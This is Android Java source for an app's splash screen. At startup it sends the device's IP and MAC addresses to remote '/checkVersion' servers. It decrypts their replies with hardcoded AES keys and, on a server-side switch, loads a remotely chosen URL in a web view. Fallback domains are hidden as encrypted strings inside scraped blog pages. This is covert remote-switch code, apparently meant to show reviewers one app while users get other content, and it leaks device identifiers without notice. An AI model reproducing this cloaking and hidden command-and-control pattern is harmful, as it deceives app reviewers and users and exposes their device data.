package com.hxjr.hxjr;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.request.base.Request;
import com.pro.switchlibrary.AES;
import com.pro.switchlibrary.AppConfig;
import com.pro.switchlibrary.DeviceUtil;
import com.pro.switchlibrary.OWebActivity;
import com.pro.switchlibrary.SPUtils;
import com.pro.switchlibrary.SwitchMainEnter;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SplashActivity extends Activity {
    private static String KEY = "42980fcm2d3409d!";
    private static String HEX_KEY = "1111111122222222";
    public static String RGEX = "@@(.*?)@@";
    private static String QUDAO = BuildConfig.QUDAO;
    private String ipAddress;
    private String macAddress;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        SwitchMainEnter.getInstance().initOCR(this, BuildConfig.AK, BuildConfig.SK);

        startActivity();
    }


    public static String getSubUtilSimple(String soap, String rgex) {
        Pattern pattern = Pattern.compile(rgex);// 匹配的模式
        Matcher m = pattern.matcher(soap);
        while (m.find()) {
            return m.group(1);
        }
        return "";
    }

    public static List<String> getUrlList(String urls) {
        List<String> list = new ArrayList<>();
        String[] split = urls.split(";");
        for (int i = 0; i < split.length; i++) {
            list.add(split[i]);
        }

        return list;
    }

    int CHECKVERSION_INDEX = 0;//市场手动输入开关地址下标
    int BLOG_INDEX = 0; //市场手动输入的博客地址下标

    int CACHE_CHECKVERSION_INDEX = 0;

    //Aaron 修改直接跳到主页
    private void startActivity() {
        ipAddress = DeviceUtil.getIPAddress(this);
        macAddress = DeviceUtil.getMACAddress(this);

        JsonEntity data = SPUtils.getData(AppConfig.CHECKVERSION, JsonEntity.class);
        if (BuildConfig.CHECKVERSION_URL_LIST.length>0){
            if (data != null) {
                List<String> dPool = data.getDPool();
                if (dPool.size() != 0) {
                    getCacheCheckVersion(data, CACHE_CHECKVERSION_INDEX);
                }else {
                    getCheckVersion(BuildConfig.CHECKVERSION_URL_LIST[CHECKVERSION_INDEX]);
                }
            } else {
                getCheckVersion(BuildConfig.CHECKVERSION_URL_LIST[CHECKVERSION_INDEX]);
            }
        }else {
            getBlog(BuildConfig.BLOG_URL_LIST[BLOG_INDEX]);
        }


    }

    private void getCheckVersion(String url) {
        OkGo.<String>post(url + "/checkVersion")
                .tag("url1")
                .params("name", QUDAO)
                .params("ip", ipAddress)
                .params("mac", macAddress)
                .execute(new StringCallback() {
                    @Override
                    public void onStart(Request<String, ? extends Request> request) {
                        super.onStart(request);
                    }

                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {


                        if (!TextUtils.isEmpty(response.body())) {
                            try {
                                String decrypt = AES.Decrypt(response.body().getBytes(), KEY);
                                Log.d("print", "onSuccess:解密后数据1: " + decrypt);
                                JsonEntity jsonEntity = new Gson().fromJson(decrypt, JsonEntity.class);
                                Log.d("print", "onSuccess:131 1: " + jsonEntity);

                                SPUtils.putData(AppConfig.CHECKVERSION, jsonEntity);


                                if (jsonEntity.getStatus().equals("true") || jsonEntity.getStatus().equals("1")) {
                                    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN,
                                            WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
                                    SwitchMainEnter.getInstance().goToWeb(SplashActivity.this, jsonEntity.getUrl(), null);
                                    SplashActivity.this.finish();

                                } else {
                                    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN,
                                            WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
                                    SwitchMainEnter.getInstance().goToWeb(SplashActivity.this, BuildConfig.WEB_URL, null);
                                    SplashActivity.this.finish();

                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                        }
                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);
                        CHECKVERSION_INDEX++;
                        if (CHECKVERSION_INDEX < BuildConfig.CHECKVERSION_URL_LIST.length) {
                            Log.d("print", "onError: 156: " + CHECKVERSION_INDEX);
                            getCheckVersion(BuildConfig.CHECKVERSION_URL_LIST[CHECKVERSION_INDEX]);
                        } else {
                            Log.d("print", "onError: 159: " + CHECKVERSION_INDEX);
                            getBlog(BuildConfig.BLOG_URL_LIST[BLOG_INDEX]);
                        }

                    }
                });

    }

    int GET_BLOG_INDEX = 0;//直接接口获取的博客下标

    private void getBlog(String blogUrl) {
        OkGo.<String>get(blogUrl)
                .tag(this)
                .cacheKey("version")
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {

                        if (!TextUtils.isEmpty(response.body())) {

                            Document document = Jsoup.parse(response.body());
                            String subUtilSimple = getSubUtilSimple(document.toString(), RGEX);

                            String s1;
                            try {
                                s1 = AES.HexDecrypt(subUtilSimple.getBytes(), HEX_KEY);
                                List<String> urlList = getUrlList(s1);

                                if (urlList.size() > 0) {
                                    getBlogCheckVersion(urlList, GET_BLOG_INDEX);
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                        }


                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);
                        BLOG_INDEX++;
                        if (BLOG_INDEX < BuildConfig.BLOG_URL_LIST.length) {
                            Log.d("print", "onError: 212:" + BLOG_INDEX);
                            getBlog(BuildConfig.BLOG_URL_LIST[BLOG_INDEX]);
                        } else {
                            Log.d("print", "onError: 215:" + BLOG_INDEX);

                            Toast.makeText(SplashActivity.this, "当前网络不好,已退出", Toast.LENGTH_SHORT).show();
                            SplashActivity.this.finish();
                        }

                    }
                });
    }

    private void getBlogCheckVersion(final List<String> urlList, int index) {
        OkGo.<String>post(urlList.get(index) + "/checkVersion")
                .tag("url1")
                .params("name", QUDAO)
                .params("ip", ipAddress)
                .params("mac", macAddress)
                .execute(new StringCallback() {


                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {

                        if (!TextUtils.isEmpty(response.body())) {
                            Log.d("print", "onSuccess:256 " + response.body());
                            try {
                                String decrypt = AES.Decrypt(response.body().getBytes(), KEY);
                                Log.d("print", "onSuccess:解密后数据2: " + decrypt);
                                JsonEntity jsonEntity = new Gson().fromJson(decrypt, JsonEntity.class);
                                Log.d("print", "onSuccess:131 2: " + jsonEntity);
                                OkGo.getInstance().cancelAll();

                                if (jsonEntity.getStatus().equals("true") || jsonEntity.getStatus().equals("1")) {
                                    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN,
                                            WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
                                    SwitchMainEnter.getInstance().goToWeb(SplashActivity.this, jsonEntity.getUrl(), null);
                                    SplashActivity.this.finish();

                                } else {
                                    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN,
                                            WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
                                    SwitchMainEnter.getInstance().goToWeb(SplashActivity.this, BuildConfig.WEB_URL, null);
                                    SplashActivity.this.finish();

                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                        }
                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);
                        GET_BLOG_INDEX++;
                        if (GET_BLOG_INDEX < urlList.size()) {
                            getBlogCheckVersion(urlList, GET_BLOG_INDEX);
                        } else {
                            SPUtils.remove(AppConfig.CHECKVERSION);
                            Toast.makeText(SplashActivity.this, "当前网络不好,已退出", Toast.LENGTH_SHORT).show();
                            SplashActivity.this.finish();
                        }


                    }
                });

    }

    int CACHE_BLOG_INDEX = 0;//缓存的博客地址下标

    private void getCacheCheckVersion(final JsonEntity data, int index) {
        OkGo.<String>post(data.getDPool().get(index) + "/checkVersion")
                .tag("url1")
                .params("name", QUDAO)
                .params("ip", ipAddress)
                .params("mac", macAddress)
                .execute(new StringCallback() {
                    @Override
                    public void onStart(Request<String, ? extends Request> request) {
                        super.onStart(request);
                    }

                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {
                        Log.d("print", "onSuccess:106 " + response.body());


                        if (!TextUtils.isEmpty(response.body())) {
                            try {
                                String decrypt = AES.Decrypt(response.body().getBytes(), KEY);
                                Log.d("print", "onSuccess:缓存解密后数据1: " + decrypt);
                                JsonEntity jsonEntity = new Gson().fromJson(decrypt, JsonEntity.class);
                                Log.d("print", "onSuccess:缓存1: " + jsonEntity);
                                if (jsonEntity.getStatus().equals("true") || jsonEntity.getStatus().equals("1")) {
                                    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN,
                                            WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
                                    SwitchMainEnter.getInstance().goToWeb(SplashActivity.this, jsonEntity.getUrl(), null);
                                    SplashActivity.this.finish();

                                } else {
                                    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN,
                                            WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
                                    SwitchMainEnter.getInstance().goToWeb(SplashActivity.this, BuildConfig.WEB_URL, null);
                                    SplashActivity.this.finish();

                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);
                        CACHE_CHECKVERSION_INDEX++;
                        if (CACHE_CHECKVERSION_INDEX < data.getDPool().size()) {
                            getCacheCheckVersion(data, CACHE_CHECKVERSION_INDEX);
                        } else {
                            if (data.getDBlog() != null) {
                                getCacheBlog(data.getDBlog(), CACHE_BLOG_INDEX);
                            }
                        }
                    }
                });

    }


    private void getCacheBlog(final List<String> dblog, int index) {
        OkGo.<String>get(dblog.get(index))
                .tag(this)
                .cacheKey("version")
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {

                        if (!TextUtils.isEmpty(response.body())) {

                            Document document = Jsoup.parse(response.body());
                            String subUtilSimple = getSubUtilSimple(document.toString(), RGEX);

                            String s1;
                            try {
                                s1 = AES.HexDecrypt(subUtilSimple.getBytes(), HEX_KEY);
                                List<String> urlList = getUrlList(s1);

                                if (urlList.size() > 0) {
                                    getBlogCheckVersion(urlList, GET_BLOG_INDEX);
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }


                        }


                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);
                        CACHE_BLOG_INDEX++;
                        if (CACHE_BLOG_INDEX < dblog.size()) {
                            Log.d("print", "onError: 384:" + CACHE_BLOG_INDEX);
                            getCacheBlog(dblog, CACHE_BLOG_INDEX);
                        } else {
                            Log.d("print", "onError: 387:" + BLOG_INDEX);
                            SPUtils.remove(AppConfig.CHECKVERSION);
                            Toast.makeText(SplashActivity.this, "当前网络不好,已退出", Toast.LENGTH_SHORT).show();
                            SplashActivity.this.finish();
                        }

                    }
                });
    }

    @Override
    protected void onResume() {
        super.onResume();

    }

    @Override
    protected void onPause() {
        super.onPause();

    }


}
